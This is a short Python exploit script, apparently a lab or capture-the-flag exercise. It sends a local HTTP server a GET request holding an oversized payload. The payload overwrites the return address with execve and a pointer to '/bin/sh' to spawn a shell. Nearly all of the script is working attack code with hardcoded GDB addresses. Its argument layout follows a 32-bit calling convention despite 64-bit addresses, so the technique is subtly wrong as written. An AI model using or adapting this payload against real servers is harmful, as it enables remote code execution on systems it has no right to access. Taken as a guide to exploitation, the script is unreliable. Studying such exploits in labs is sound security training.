#!/usr/bin/env python3
import socket
import struct

host = "localhost"
port = 8080

# Found in GDB
execve_addr = struct.pack("<Q", 0x7ffff7e7f310)

# NULL pointer
null = struct.pack("<Q", 0x0)

# Estimate stack address pointing to "/bin/sh" placed after the payload
# You may need to adjust this based on GDB — try 0x7fffffffe510 and nearby
binsh_ptr = struct.pack("<Q", 0x7fffffffe510)

# Build payload
payload = b"A" * 4120            # Adjust if needed (to reach return address)
payload += execve_addr           # Overwrite return address with execve()
payload += null                  # Return address after execve — can be NULL
payload += binsh_ptr             # 1st argument: pointer to "/bin/sh"
payload += null                  # 2nd argument: argv
payload += null                  # 3rd argument: envp
payload += b"/bin/sh\x00"        # Add the actual string to memory

# Final HTTP request
request = b"GET /" + payload + b" HTTP/1.0\r\n\r\n"

# Send request
s = socket.create_connection((host, port))
s.send(request)
s.close()
